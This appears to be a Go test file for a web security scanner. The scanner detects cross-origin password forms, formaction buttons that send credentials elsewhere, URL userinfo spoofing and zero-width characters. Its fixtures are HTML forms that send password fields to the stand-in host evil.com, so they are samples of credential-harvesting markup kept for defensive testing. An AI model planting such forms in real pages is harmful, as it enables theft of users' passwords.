package scanner

import (
	"strings"
	"testing"
)

func TestDomainOf(t *testing.T) {
	cases := []struct{ in, want string }{
		{"https://www.jnu.ac.kr/", "www.jnu.ac.kr"},
		{"http://a.com:8080/x?y", "a.com"},
		{"//cdn.example.com/x.js", "cdn.example.com"},
		{"https://evil.com@bank.com/login", "bank.com"},
		{"https://bank.com@evil.com/login", "evil.com"},
		{"/relative/path", ""},
		{"", ""},
	}
	for _, c := range cases {
		if got := domainOf(c.in); got != c.want {
			t.Errorf("domainOf(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestFormOrigin(t *testing.T) {
	const page = "https://bank.example.com/login"
	const code = "cross-origin-password-form"
	cases := []struct {
		name string
		html string
		want int
	}{
		{"외부도메인+비밀번호", `<form action="https://evil.com/x"><input type=password></form>`, 1},
		{"상대경로", `<form action="/login"><input type=password></form>`, 0},
		{"같은도메인", `<form action="https://bank.example.com/x"><input type=password></form>`, 0},
		{"비밀번호없음", `<form action="https://evil.com/x"><input type=text></form>`, 0},
		{"form안닫힘", `<form action="https://evil.com/x"><input type=password>`, 1},
		{"대문자타입", `<form action="https://evil.com/x"><input TYPE=PASSWORD></form>`, 1},
		{"유저정보속임", `<form action="https://bank.example.com@evil.com/x"><input type=password></form>`, 1},
		{"폼밖의비밀번호", `<input type=password><form action="https://evil.com/x"></form>`, 0},
		{"중첩form", `<form action="https://evil.com/x"><form action="/safe"><input type=password></form></form>`, 1},
		{"div속깊이", `<form action="https://evil.com/x"><div><p><input type=password>`, 1},
		{"표속", `<form action="https://evil.com/x"><table><tr><td><input type=password>`, 1},
		// formaction — 비밀번호와 버튼은 어느 쪽이 먼저 와도 같은 폼이면 판정한다
		{"formaction외부", `<form action="/login"><input type=password><button formaction="https://evil.com/x">로그인</button></form>`, 1},
		{"버튼이먼저", `<form action="/login"><button formaction="https://evil.com/x">로그인</button><input type=password></form>`, 1},
		{"action과formaction둘다외부", `<form action="https://evil.com/a"><input type=password><button formaction="https://evil2.com/b">x</button></form>`, 2},
		{"비밀번호없는폼", `<form action="/search"><input name=q><button formaction="https://evil.com/x">검색</button></form>`, 0},
		{"type=button", `<form action="/login"><input type=password><button type=button formaction="https://evil.com/x">x</button></form>`, 0},
		{"다른폼의버튼", `<form action="/login"><input type=password></form><form action="/s"><button formaction="https://evil.com/x">x</button></form>`, 0},
		// 한 폼·한 전송지는 한 건 — 비밀번호 확인 칸이 있어도 조치는 하나다
		{"비밀번호둘", `<form action="https://evil.com/x"><input type=password><input type=password></form>`, 1},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := countCode(c.html, page, code); got != c.want {
				t.Errorf("%s → %d건, want %d건", c.html, got, c.want)
			}
		})
	}
}

func TestZeroWidth(t *testing.T) {
	const code = "zero-width"
	cases := []struct {
		name string
		html string
		want int
	}{
		{"정상", "<p>정상 텍스트</p>", 0},
		{"텍스트", "<p>보이지\u200b않음</p>", 1},
		{"속성값", "<a href=\"a\u200bb.com\">x</a>", 1},
		{"BOM", "<p>\uFEFF</p>", 1},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := countCode(c.html, "", code); got != c.want {
				t.Errorf("%q → %d건, want %d건", c.html, got, c.want)
			}
		})
	}
}

// action 이면 비밀번호 입력, 비밀번호 뒤에 온 formaction이면 버튼.
func TestCredentialOffset(t *testing.T) {
	const page = "https://bank.example.com/"
	cases := []struct{ name, html, at string }{
		{"action은입력", `<form action="https://evil.com/x"><input type=password></form>`, "<input"},
		{"formaction은버튼", `<form action="/login"><input type=password><button formaction="https://evil.com/x">x</button></form>`, "<button"},
		{"버튼이먼저면입력", `<form action="/login"><button formaction="https://evil.com/x">x</button><input type=password></form>`, "<input"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			f, ok := findFirst(c.html, page, "cross-origin-password-form")
			if !ok {
				t.Fatal("발견되지 않음")
			}
			if !strings.HasPrefix(c.html[f.Offset:], c.at) {
				t.Errorf("위치 %q, want %s…", c.html[f.Offset:], c.at)
			}
		})
	}
}
